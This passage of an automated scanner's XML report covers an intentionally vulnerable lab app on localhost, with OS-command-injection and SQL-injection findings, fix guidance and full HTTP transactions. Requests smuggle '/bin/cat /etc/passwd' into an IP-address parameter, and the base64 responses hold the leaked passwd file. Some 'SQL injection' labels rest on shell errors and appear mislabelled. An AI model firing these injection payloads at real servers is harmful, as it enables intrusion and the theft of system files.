        <body content-encoding="base64">eyJjb250ZW50IjoiQnVzeUJveCB2MS4yOS4zICgyMDE5LTAxLTI0IDA3OjQ1OjA3IFVUQykgbXVsdGktY2FsbCBiaW5hcnkuXG5cblVzYWdlOiBwaW5nIFtPUFRJT05TXSBIT1NUXG5cblNlbmQgSUNNUCBFQ0hPX1JFUVVFU1QgcGFja2V0cyB0byBuZXR3b3JrIGhvc3RzXG5cblx0LTQsLTZcdFx0Rm9yY2UgSVAgb3IgSVB2NiBuYW1lIHJlc29sdXRpb25cblx0LWMgQ05UXHRcdFNlbmQgb25seSBDTlQgcGluZ3Ncblx0LXMgU0laRVx0XHRTZW5kIFNJWkUgZGF0YSBieXRlcyBpbiBwYWNrZXRzIChkZWZhdWx0IDU2KVxuXHQtQVx0XHRQaW5nIGFzIHNvb24gYXMgcmVwbHkgaXMgcmVjZXZpZWRcblx0LXQgVFRMXHRcdFNldCBUVExcblx0LUkgSUZBQ0UvSVBcdFNvdXJjZSBpbnRlcmZhY2Ugb3IgSVAgYWRkcmVzc1xuXHQtVyBTRUNcdFx0U2Vjb25kcyB0byB3YWl0IGZvciB0aGUgZmlyc3QgcmVzcG9uc2UgKGRlZmF1bHQgMTApXG5cdFx0XHQoYWZ0ZXIgYWxsIC1jIENOVCBwYWNrZXRzIGFyZSBzZW50KVxuXHQtdyBTRUNcdFx0U2Vjb25kcyB1bnRpbCBwaW5nIGV4aXRzIChkZWZhdWx0OmluZmluaXRlKVxuXHRcdFx0KGNhbiBleGl0IGVhcmxpZXIgd2l0aCAtYyBDTlQpXG5cdC1xXHRcdFF1aWV0LCBvbmx5IGRpc3BsYXkgb3V0cHV0IGF0IHN0YXJ0XG5cdFx0XHRhbmQgd2hlbiBmaW5pc2hlZFxuXHQtcCBIRVhCWVRFXHRQYXR0ZXJuIHRvIHVzZSBmb3IgcGF5bG9hZFxucm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYXNoXG5iaW46eDoxOjE6YmluOi9iaW46L3NiaW4vbm9sb2dpblxuZGFlbW9uOng6MjoyOmRhZW1vbjovc2Jpbjovc2Jpbi9ub2xvZ2luXG5hZG06eDozOjQ6YWRtOi92YXIvYWRtOi9zYmluL25vbG9naW5cbmxwOng6NDo3OmxwOi92YXIvc3Bvb2wvbHBkOi9zYmluL25vbG9naW5cbnN5bmM6eDo1OjA6c3luYzovc2JpbjovYmluL3N5bmNcbnNodXRkb3duOng6NjowOnNodXRkb3duOi9zYmluOi9zYmluL3NodXRkb3duXG5oYWx0Ong6NzowOmhhbHQ6L3NiaW46L3NiaW4vaGFsdFxubWFpbDp4Ojg6MTI6bWFpbDovdmFyL3Nwb29sL21haWw6L3NiaW4vbm9sb2dpblxubmV3czp4Ojk6MTM6bmV3czovdXNyL2xpYi9uZXdzOi9zYmluL25vbG9naW5cbnV1Y3A6eDoxMDoxNDp1dWNwOi92YXIvc3Bvb2wvdXVjcHB1YmxpYzovc2Jpbi9ub2xvZ2luXG5vcGVyYXRvcjp4OjExOjA6b3BlcmF0b3I6L3Jvb3Q6L2Jpbi9zaFxubWFuOng6MTM6MTU6bWFuOi91c3IvbWFuOi9zYmluL25vbG9naW5cbnBvc3RtYXN0ZXI6eDoxNDoxMjpwb3N0bWFzdGVyOi92YXIvc3Bvb2wvbWFpbDovc2Jpbi9ub2xvZ2luXG5jcm9uOng6MTY6MTY6Y3JvbjovdmFyL3Nwb29sL2Nyb246L3NiaW4vbm9sb2dpblxuZnRwOng6MjE6MjE6Oi92YXIvbGliL2Z0cDovc2Jpbi9ub2xvZ2luXG5zc2hkOng6MjI6MjI6c3NoZDovZGV2L251bGw6L3NiaW4vbm9sb2dpblxuYXQ6eDoyNToyNTphdDovdmFyL3Nwb29sL2Nyb24vYXRqb2JzOi9zYmluL25vbG9naW5cbnNxdWlkOng6MzE6MzE6U3F1aWQ6L3Zhci9jYWNoZS9zcXVpZDovc2Jpbi9ub2xvZ2luXG54ZnM6eDozMzozMzpYIEZvbnQgU2VydmVyOi9ldGMvWDExL2ZzOi9zYmluL25vbG9naW5cbmdhbWVzOng6MzU6MzU6Z2FtZXM6L3Vzci9nYW1lczovc2Jpbi9ub2xvZ2luXG5wb3N0Z3Jlczp4OjcwOjcwOjovdmFyL2xpYi9wb3N0Z3Jlc3FsOi9iaW4vc2hcbmN5cnVzOng6ODU6MTI6Oi91c3IvY3lydXM6L3NiaW4vbm9sb2dpblxudnBvcG1haWw6eDo4OTo4OTo6L3Zhci92cG9wbWFpbDovc2Jpbi9ub2xvZ2luXG5udHA6eDoxMjM6MTIzOk5UUDovdmFyL2VtcHR5Oi9zYmluL25vbG9naW5cbnNtbXNwOng6MjA5OjIwOTpzbW1zcDovdmFyL3Nwb29sL21xdWV1ZTovc2Jpbi9ub2xvZ2luXG5ndWVzdDp4OjQwNToxMDA6Z3Vlc3Q6L2Rldi9udWxsOi9zYmluL25vbG9naW5cbm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovOi9zYmluL25vbG9naW5cbiIsImlzVmFsaWQiOnRydWV9</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[1496]" method="GET" name="SQL injection" plugin="sqli" severity="High" url="http://localhost/VulnerableApp/CommandInjection/LEVEL_3" var="ipaddress">
    <description>SQL injection in a Unknown database was found at: &quot;http://localhost/VulnerableApp/CommandInjection/LEVEL_3&quot;, using HTTP method GET. The sent data was: &quot;ipaddress=a%27b%22c%27d%22&quot; The modified parameter was &quot;ipaddress&quot;.</description>

    <long-description>Due to the requirement for dynamic content of today's web
applications, many rely on a database backend to store data that will
be called upon and processed by the web application (or other
programs). Web applications retrieve data from the database by using
Structured Query Language (SQL) queries.

To meet demands of many
developers, database servers (such as MSSQL, MySQL, Oracle etc.) have
additional built-in functionality that can allow extensive control of
the database and interaction with the host operating system itself.
An SQL injection occurs when a value originating from the client's
request is used within a SQL query without prior sanitisation. This
could allow cyber-criminals to execute arbitrary SQL code and steal
data or use the additional functionality of the database server to
take control of more server components.

The successful exploitation
of a SQL injection can be devastating to an organisation and is one of
the most commonly exploited web application vulnerabilities.

This
injection was detected as the tool was able to cause the server to
respond to the request with a database related error.</long-description>
    <fix-guidance>The only proven method to prevent against SQL injection attacks while
still maintaining full application functionality is to use
parameterized queries (also known as prepared statements). When
utilising this method of querying the database, any value supplied by
the client will be handled as a string value rather than part of the
SQL query.

Additionally, when utilising parameterized queries, the
database engine will automatically check to make sure the string being
used matches that of the column. For example, the database engine will
check that the user supplied input is an integer if the database
column is configured to contain integers.</fix-guidance>
    <fix-effort>50</fix-effort>
    <references>
            <reference title="SecuriTeam" url="http://www.securiteam.com/securityreviews/5DP0N1P76E.html" />
            <reference title="Wikipedia" url="http://en.wikipedia.org/wiki/SQL_injection" />
            <reference title="OWASP" url="https://www.owasp.org/index.php/SQL_Injection" />
            <reference title="WASC" url="http://projects.webappsec.org/w/page/13246963/SQL%20Injection" />
            <reference title="W3 Schools" url="http://www.w3schools.com/sql/sql_injection.asp" />
            <reference title="UnixWiz" url="http://unixwiz.net/techtips/sql-injection.html" />
    </references>

    <http-transactions>
            <http-transaction id="1496">

    <http-request>
        <status>GET http://localhost/VulnerableApp/CommandInjection/LEVEL_3?ipaddress=a%27b%22c%27d%22 HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:07:02 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50Ijoic2g6IHN5bnRheCBlcnJvcjogdW50ZXJtaW5hdGVkIHF1b3RlZCBzdHJpbmdcbiIsImlzVmFsaWQiOnRydWV9</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[1573]" method="GET" name="OS commanding vulnerability" plugin="os_commanding" severity="High" url="http://localhost/VulnerableApp/CommandInjection/LEVEL_3" var="ipaddress">
    <description>OS Commanding was found at: &quot;http://localhost/VulnerableApp/CommandInjection/LEVEL_3&quot;, using HTTP method GET. The sent data was: &quot;ipaddress=%7C%2Fbin%2Fcat%20%2Fetc%2Fpasswd&quot; The modified parameter was &quot;ipaddress&quot;.</description>

    <long-description>To perform specific actions from within a web application, it is
occasionally required to run Operating System commands and have the
output of these commands captured by the web application and returned
to the client.

OS command injection occurs when user supplied input
is inserted into one of these commands without proper sanitisation and
is then executed by the server.

Cyber-criminals will abuse this
weakness to perform their own arbitrary commands on the server. This
can include everything from simple `ping` commands to map the internal
network, to obtaining full control of the server.



It was possible to inject and verify the execution of specific Operating
System commands which indicates that proper input sanitisation is not
occurring.</long-description>
    <fix-guidance>It is recommended that untrusted data is never used to form a command
to be executed by the OS.

To validate data, the application should ensure that the supplied value 
contains only the characters that are required to perform the
required action.

For example, where the form field expects an IP address, only numbers
and periods should be accepted. Additionally, all control operators
(`&amp;`, `&amp;&amp;`, `|`, `||`, `$`, `\`, `#`) should be explicitly denied
and never accepted as valid input by the server.</fix-guidance>
    <fix-effort>50</fix-effort>
    <references>
            <reference title="WASC" url="http://projects.webappsec.org/w/page/13246950/OS%20Commanding" />
            <reference title="OWASP" url="https://www.owasp.org/index.php/OS_Command_Injection" />
    </references>

    <http-transactions>
            <http-transaction id="1573">

    <http-request>
        <status>GET http://localhost/VulnerableApp/CommandInjection/LEVEL_3?ipaddress=%7C%2Fbin%2Fcat%20%2Fetc%2Fpasswd HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:07:04 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50Ijoicm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYXNoXG5iaW46eDoxOjE6YmluOi9iaW46L3NiaW4vbm9sb2dpblxuZGFlbW9uOng6MjoyOmRhZW1vbjovc2Jpbjovc2Jpbi9ub2xvZ2luXG5hZG06eDozOjQ6YWRtOi92YXIvYWRtOi9zYmluL25vbG9naW5cbmxwOng6NDo3OmxwOi92YXIvc3Bvb2wvbHBkOi9zYmluL25vbG9naW5cbnN5bmM6eDo1OjA6c3luYzovc2JpbjovYmluL3N5bmNcbnNodXRkb3duOng6NjowOnNodXRkb3duOi9zYmluOi9zYmluL3NodXRkb3duXG5oYWx0Ong6NzowOmhhbHQ6L3NiaW46L3NiaW4vaGFsdFxubWFpbDp4Ojg6MTI6bWFpbDovdmFyL3Nwb29sL21haWw6L3NiaW4vbm9sb2dpblxubmV3czp4Ojk6MTM6bmV3czovdXNyL2xpYi9uZXdzOi9zYmluL25vbG9naW5cbnV1Y3A6eDoxMDoxNDp1dWNwOi92YXIvc3Bvb2wvdXVjcHB1YmxpYzovc2Jpbi9ub2xvZ2luXG5vcGVyYXRvcjp4OjExOjA6b3BlcmF0b3I6L3Jvb3Q6L2Jpbi9zaFxubWFuOng6MTM6MTU6bWFuOi91c3IvbWFuOi9zYmluL25vbG9naW5cbnBvc3RtYXN0ZXI6eDoxNDoxMjpwb3N0bWFzdGVyOi92YXIvc3Bvb2wvbWFpbDovc2Jpbi9ub2xvZ2luXG5jcm9uOng6MTY6MTY6Y3JvbjovdmFyL3Nwb29sL2Nyb246L3NiaW4vbm9sb2dpblxuZnRwOng6MjE6MjE6Oi92YXIvbGliL2Z0cDovc2Jpbi9ub2xvZ2luXG5zc2hkOng6MjI6MjI6c3NoZDovZGV2L251bGw6L3NiaW4vbm9sb2dpblxuYXQ6eDoyNToyNTphdDovdmFyL3Nwb29sL2Nyb24vYXRqb2JzOi9zYmluL25vbG9naW5cbnNxdWlkOng6MzE6MzE6U3F1aWQ6L3Zhci9jYWNoZS9zcXVpZDovc2Jpbi9ub2xvZ2luXG54ZnM6eDozMzozMzpYIEZvbnQgU2VydmVyOi9ldGMvWDExL2ZzOi9zYmluL25vbG9naW5cbmdhbWVzOng6MzU6MzU6Z2FtZXM6L3Vzci9nYW1lczovc2Jpbi9ub2xvZ2luXG5wb3N0Z3Jlczp4OjcwOjcwOjovdmFyL2xpYi9wb3N0Z3Jlc3FsOi9iaW4vc2hcbmN5cnVzOng6ODU6MTI6Oi91c3IvY3lydXM6L3NiaW4vbm9sb2dpblxudnBvcG1haWw6eDo4OTo4OTo6L3Zhci92cG9wbWFpbDovc2Jpbi9ub2xvZ2luXG5udHA6eDoxMjM6MTIzOk5UUDovdmFyL2VtcHR5Oi9zYmluL25vbG9naW5cbnNtbXNwOng6MjA5OjIwOTpzbW1zcDovdmFyL3Nwb29sL21xdWV1ZTovc2Jpbi9ub2xvZ2luXG5ndWVzdDp4OjQwNToxMDA6Z3Vlc3Q6L2Rldi9udWxsOi9zYmluL25vbG9naW5cbm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovOi9zYmluL25vbG9naW5cbkJ1c3lCb3ggdjEuMjkuMyAoMjAxOS0wMS0yNCAwNzo0NTowNyBVVEMpIG11bHRpLWNhbGwgYmluYXJ5LlxuXG5Vc2FnZTogcGluZyBbT1BUSU9OU10gSE9TVFxuXG5TZW5kIElDTVAgRUNIT19SRVFVRVNUIHBhY2tldHMgdG8gbmV0d29yayBob3N0c1xuXG5cdC00LC02XHRcdEZvcmNlIElQIG9yIElQdjYgbmFtZSByZXNvbHV0aW9uXG5cdC1jIENOVFx0XHRTZW5kIG9ubHkgQ05UIHBpbmdzXG5cdC1zIFNJWkVcdFx0U2VuZCBTSVpFIGRhdGEgYnl0ZXMgaW4gcGFja2V0cyAoZGVmYXVsdCA1Nilcblx0LUFcdFx0UGluZyBhcyBzb29uIGFzIHJlcGx5IGlzIHJlY2V2aWVkXG5cdC10IFRUTFx0XHRTZXQgVFRMXG5cdC1JIElGQUNFL0lQXHRTb3VyY2UgaW50ZXJmYWNlIG9yIElQIGFkZHJlc3Ncblx0LVcgU0VDXHRcdFNlY29uZHMgdG8gd2FpdCBmb3IgdGhlIGZpcnN0IHJlc3BvbnNlIChkZWZhdWx0IDEwKVxuXHRcdFx0KGFmdGVyIGFsbCAtYyBDTlQgcGFja2V0cyBhcmUgc2VudClcblx0LXcgU0VDXHRcdFNlY29uZHMgdW50aWwgcGluZyBleGl0cyAoZGVmYXVsdDppbmZpbml0ZSlcblx0XHRcdChjYW4gZXhpdCBlYXJsaWVyIHdpdGggLWMgQ05UKVxuXHQtcVx0XHRRdWlldCwgb25seSBkaXNwbGF5IG91dHB1dCBhdCBzdGFydFxuXHRcdFx0YW5kIHdoZW4gZmluaXNoZWRcblx0LXAgSEVYQllURVx0UGF0dGVybiB0byB1c2UgZm9yIHBheWxvYWRcbiIsImlzVmFsaWQiOnRydWV9</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[1781]" method="GET" name="SQL injection" plugin="sqli" severity="High" url="http://localhost/VulnerableApp/CommandInjection/LEVEL_4" var="ipaddress">
    <description>SQL injection in a Unknown database was found at: &quot;http://localhost/VulnerableApp/CommandInjection/LEVEL_4&quot;, using HTTP method GET. The sent data was: &quot;ipaddress=a%27b%22c%27d%22&quot; The modified parameter was &quot;ipaddress&quot;.</description>

    <long-description>Due to the requirement for dynamic content of today's web
applications, many rely on a database backend to store data that will
be called upon and processed by the web application (or other
programs). Web applications retrieve data from the database by using
Structured Query Language (SQL) queries.

To meet demands of many
developers, database servers (such as MSSQL, MySQL, Oracle etc.) have
additional built-in functionality that can allow extensive control of
the database and interaction with the host operating system itself.
An SQL injection occurs when a value originating from the client's
request is used within a SQL query without prior sanitisation. This
could allow cyber-criminals to execute arbitrary SQL code and steal
data or use the additional functionality of the database server to
take control of more server components.

The successful exploitation
of a SQL injection can be devastating to an organisation and is one of
the most commonly exploited web application vulnerabilities.

This
injection was detected as the tool was able to cause the server to
respond to the request with a database related error.</long-description>
    <fix-guidance>The only proven method to prevent against SQL injection attacks while
still maintaining full application functionality is to use
parameterized queries (also known as prepared statements). When
utilising this method of querying the database, any value supplied by
the client will be handled as a string value rather than part of the
SQL query.

Additionally, when utilising parameterized queries, the
database engine will automatically check to make sure the string being
used matches that of the column. For example, the database engine will
check that the user supplied input is an integer if the database
column is configured to contain integers.</fix-guidance>
    <fix-effort>50</fix-effort>
    <references>
            <reference title="SecuriTeam" url="http://www.securiteam.com/securityreviews/5DP0N1P76E.html" />
            <reference title="Wikipedia" url="http://en.wikipedia.org/wiki/SQL_injection" />
            <reference title="OWASP" url="https://www.owasp.org/index.php/SQL_Injection" />
            <reference title="WASC" url="http://projects.webappsec.org/w/page/13246963/SQL%20Injection" />
            <reference title="W3 Schools" url="http://www.w3schools.com/sql/sql_injection.asp" />
            <reference title="UnixWiz" url="http://unixwiz.net/techtips/sql-injection.html" />
    </references>

    <http-transactions>
            <http-transaction id="1781">

    <http-request>
        <status>GET http://localhost/VulnerableApp/CommandInjection/LEVEL_4?ipaddress=a%27b%22c%27d%22 HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:07:10 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50Ijoic2g6IHN5bnRheCBlcnJvcjogdW50ZXJtaW5hdGVkIHF1b3RlZCBzdHJpbmdcbiIsImlzVmFsaWQiOnRydWV9</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[1840]" method="GET" name="OS commanding vulnerability" plugin="os_commanding" severity="High" url="http://localhost/VulnerableApp/CommandInjection/LEVEL_4" var="ipaddress">
    <description>OS Commanding was found at: &quot;http://localhost/VulnerableApp/CommandInjection/LEVEL_4&quot;, using HTTP method GET. The sent data was: &quot;ipaddress=%7C%2Fbin%2Fcat%20%2Fetc%2Fpasswd&quot; The modified parameter was &quot;ipaddress&quot;.</description>

    <long-description>To perform specific actions from within a web application, it is
occasionally required to run Operating System commands and have the
output of these commands captured by the web application and returned
to the client.

OS command injection occurs when user supplied input
is inserted into one of these commands without proper sanitisation and
is then executed by the server.

Cyber-criminals will abuse this
weakness to perform their own arbitrary commands on the server. This
can include everything from simple `ping` commands to map the internal
network, to obtaining full control of the server.



It was possible to inject and verify the execution of specific Operating
System commands which indicates that proper input sanitisation is not
occurring.</long-description>
    <fix-guidance>It is recommended that untrusted data is never used to form a command
to be executed by the OS.

To validate data, the application should ensure that the supplied value 
contains only the characters that are required to perform the
required action.

For example, where the form field expects an IP address, only numbers
and periods should be accepted. Additionally, all control operators
(`&amp;`, `&amp;&amp;`, `|`, `||`, `$`, `\`, `#`) should be explicitly denied
and never accepted as valid input by the server.</fix-guidance>
    <fix-effort>50</fix-effort>
    <references>
            <reference title="WASC" url="http://projects.webappsec.org/w/page/13246950/OS%20Commanding" />
            <reference title="OWASP" url="https://www.owasp.org/index.php/OS_Command_Injection" />
    </references>

    <http-transactions>
            <http-transaction id="1840">

    <http-request>
        <status>GET http://localhost/VulnerableApp/CommandInjection/LEVEL_4?ipaddress=%7C%2Fbin%2Fcat%20%2Fetc%2Fpasswd HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:07:12 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50Ijoicm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYXNoXG5iaW46eDoxOjE6YmluOi9iaW46L3NiaW4vbm9sb2dpblxuZGFlbW9uOng6MjoyOmRhZW1vbjovc2Jpbjovc2Jpbi9ub2xvZ2luXG5hZG06eDozOjQ6YWRtOi92YXIvYWRtOi9zYmluL25vbG9naW5cbmxwOng6NDo3OmxwOi92YXIvc3Bvb2wvbHBkOi9zYmluL25vbG9naW5cbnN5bmM6eDo1OjA6c3luYzovc2JpbjovYmluL3N5bmNcbnNodXRkb3duOng6NjowOnNodXRkb3duOi9zYmluOi9zYmluL3NodXRkb3duXG5oYWx0Ong6NzowOmhhbHQ6L3NiaW46L3NiaW4vaGFsdFxubWFpbDp4Ojg6MTI6bWFpbDovdmFyL3Nwb29sL21haWw6L3NiaW4vbm9sb2dpblxubmV3czp4Ojk6MTM6bmV3czovdXNyL2xpYi9uZXdzOi9zYmluL25vbG9naW5cbnV1Y3A6eDoxMDoxNDp1dWNwOi92YXIvc3Bvb2wvdXVjcHB1YmxpYzovc2Jpbi9ub2xvZ2luXG5vcGVyYXRvcjp4OjExOjA6b3BlcmF0b3I6L3Jvb3Q6L2Jpbi9zaFxubWFuOng6MTM6MTU6bWFuOi91c3IvbWFuOi9zYmluL25vbG9naW5cbnBvc3RtYXN0ZXI6eDoxNDoxMjpwb3N0bWFzdGVyOi92YXIvc3Bvb2wvbWFpbDovc2Jpbi9ub2xvZ2luXG5jcm9uOng6MTY6MTY6Y3JvbjovdmFyL3Nwb29sL2Nyb246L3NiaW4vbm9sb2dpblxuZnRwOng6MjE6MjE6Oi92YXIvbGliL2Z0cDovc2Jpbi9ub2xvZ2luXG5zc2hkOng6MjI6MjI6c3NoZDovZGV2L251bGw6L3NiaW4vbm9sb2dpblxuYXQ6eDoyNToyNTphdDovdmFyL3Nwb29sL2Nyb24vYXRqb2JzOi9zYmluL25vbG9naW5cbnNxdWlkOng6MzE6MzE6U3F1aWQ6L3Zhci9jYWNoZS9zcXVpZDovc2Jpbi9ub2xvZ2luXG54ZnM6eDozMzozMzpYIEZvbnQgU2VydmVyOi9ldGMvWDExL2ZzOi9zYmluL25vbG9naW5cbmdhbWVzOng6MzU6MzU6Z2FtZXM6L3Vzci9nYW1lczovc2Jpbi9ub2xvZ2luXG5wb3N0Z3Jlczp4OjcwOjcwOjovdmFyL2xpYi9wb3N0Z3Jlc3FsOi9iaW4vc2hcbmN5cnVzOng6ODU6MTI6Oi91c3IvY3lydXM6L3NiaW4vbm9sb2dpblxudnBvcG1haWw6eDo4OTo4OTo6L3Zhci92cG9wbWFpbDovc2Jpbi9ub2xvZ2luXG5udHA6eDoxMjM6MTIzOk5UUDovdmFyL2VtcHR5Oi9zYmluL25vbG9naW5cbnNtbXNwOng6MjA5OjIwOTpzbW1zcDovdmFyL3Nwb29sL21xdWV1ZTovc2Jpbi9ub2xvZ2luXG5ndWVzdDp4OjQwNToxMDA6Z3Vlc3Q6L2Rldi9udWxsOi9zYmluL25vbG9naW5cbm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovOi9zYmluL25vbG9naW5cbkJ1c3lCb3ggdjEuMjkuMyAoMjAxOS0wMS0yNCAwNzo0NTowNyBVVEMpIG11bHRpLWNhbGwgYmluYXJ5LlxuXG5Vc2FnZTogcGluZyBbT1BUSU9OU10gSE9TVFxuXG5TZW5kIElDTVAgRUNIT19SRVFVRVNUIHBhY2tldHMgdG8gbmV0d29yayBob3N0c1xuXG5cdC00LC02XHRcdEZvcmNlIElQIG9yIElQdjYgbmFtZSByZXNvbHV0aW9uXG5cdC1jIENOVFx0XHRTZW5kIG9ubHkgQ05UIHBpbmdzXG5cdC1zIFNJWkVcdFx0U2VuZCBTSVpFIGRhdGEgYnl0ZXMgaW4gcGFja2V0cyAoZGVmYXVsdCA1Nilcblx0LUFcdFx0UGluZyBhcyBzb29uIGFzIHJlcGx5IGlzIHJlY2V2aWVkXG5cdC10IFRUTFx0XHRTZXQgVFRMXG5cdC1JIElGQUNFL0lQXHRTb3VyY2UgaW50ZXJmYWNlIG9yIElQIGFkZHJlc3Ncblx0LVcgU0VDXHRcdFNlY29uZHMgdG8gd2FpdCBmb3IgdGhlIGZpcnN0IHJlc3BvbnNlIChkZWZhdWx0IDEwKVxuXHRcdFx0KGFmdGVyIGFsbCAtYyBDTlQgcGFja2V0cyBhcmUgc2VudClcblx0LXcgU0VDXHRcdFNlY29uZHMgdW50aWwgcGluZyBleGl0cyAoZGVmYXVsdDppbmZpbml0ZSlcblx0XHRcdChjYW4gZXhpdCBlYXJsaWVyIHdpdGggLWMgQ05UKVxuXHQtcVx0XHRRdWlldCwgb25seSBkaXNwbGF5IG91dHB1dCBhdCBzdGFydFxuXHRcdFx0YW5kIHdoZW4gZmluaXNoZWRcblx0LXAgSEVYQllURVx0UGF0dGVybiB0byB1c2UgZm9yIHBheWxvYWRcbiIsImlzVmFsaWQiOnRydWV9</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[2238]" method="GET" name="SQL injection" plugin="sqli" severity="High" url="http://localhost/VulnerableApp/CommandInjection/LEVEL_5" var="ipaddress">
    <description>SQL injection in a Unknown database was found at: &quot;http://localhost/VulnerableApp/CommandInjection/LEVEL_5&quot;, using HTTP method GET. The sent data was: &quot;ipaddress=a%27b%22c%27d%22&quot; The modified parameter was &quot;ipaddress&quot;.</description>

    <long-description>Due to the requirement for dynamic content of today's web
applications, many rely on a database backend to store data that will
be called upon and processed by the web application (or other
programs). Web applications retrieve data from the database by using
Structured Query Language (SQL) queries.

To meet demands of many
developers, database servers (such as MSSQL, MySQL, Oracle etc.) have
additional built-in functionality that can allow extensive control of
the database and interaction with the host operating system itself.
An SQL injection occurs when a value originating from the client's
request is used within a SQL query without prior sanitisation. This
could allow cyber-criminals to execute arbitrary SQL code and steal
data or use the additional functionality of the database server to
take control of more server components.

The successful exploitation
of a SQL injection can be devastating to an organisation and is one of
the most commonly exploited web application vulnerabilities.

This
injection was detected as the tool was able to cause the server to
respond to the request with a database related error.</long-description>
    <fix-guidance>The only proven method to prevent against SQL injection attacks while
still maintaining full application functionality is to use
parameterized queries (also known as prepared statements). When
utilising this method of querying the database, any value supplied by
the client will be handled as a string value rather than part of the
SQL query.

Additionally, when utilising parameterized queries, the
database engine will automatically check to make sure the string being
used matches that of the column. For example, the database engine will
check that the user supplied input is an integer if the database
column is configured to contain integers.</fix-guidance>
    <fix-effort>50</fix-effort>
    <references>
            <reference title="SecuriTeam" url="http://www.securiteam.com/securityreviews/5DP0N1P76E.html" />
            <reference title="Wikipedia" url="http://en.wikipedia.org/wiki/SQL_injection" />
            <reference title="OWASP" url="https://www.owasp.org/index.php/SQL_Injection" />
            <reference title="WASC" url="http://projects.webappsec.org/w/page/13246963/SQL%20Injection" />
            <reference title="W3 Schools" url="http://www.w3schools.com/sql/sql_injection.asp" />
            <reference title="UnixWiz" url="http://unixwiz.net/techtips/sql-injection.html" />
    </references>

    <http-transactions>
            <http-transaction id="2238">

    <http-request>
        <status>GET http://localhost/VulnerableApp/CommandInjection/LEVEL_5?ipaddress=a%27b%22c%27d%22 HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:07:38 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50Ijoic2g6IHN5bnRheCBlcnJvcjogdW50ZXJtaW5hdGVkIHF1b3RlZCBzdHJpbmdcbiIsImlzVmFsaWQiOnRydWV9</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[2288]" method="GET" name="OS commanding vulnerability" plugin="os_commanding" severity="High" url="http://localhost/VulnerableApp/CommandInjection/LEVEL_5" var="ipaddress">
    <description>OS Commanding was found at: &quot;http://localhost/VulnerableApp/CommandInjection/LEVEL_5&quot;, using HTTP method GET. The sent data was: &quot;ipaddress=%0A%2Fbin%2Fcat%20%2Fetc%2Fpasswd&quot; The modified parameter was &quot;ipaddress&quot;.</description>

    <long-description>To perform specific actions from within a web application, it is
occasionally required to run Operating System commands and have the
output of these commands captured by the web application and returned
to the client.

OS command injection occurs when user supplied input
is inserted into one of these commands without proper sanitisation and
is then executed by the server.

Cyber-criminals will abuse this
weakness to perform their own arbitrary commands on the server. This
can include everything from simple `ping` commands to map the internal
network, to obtaining full control of the server.

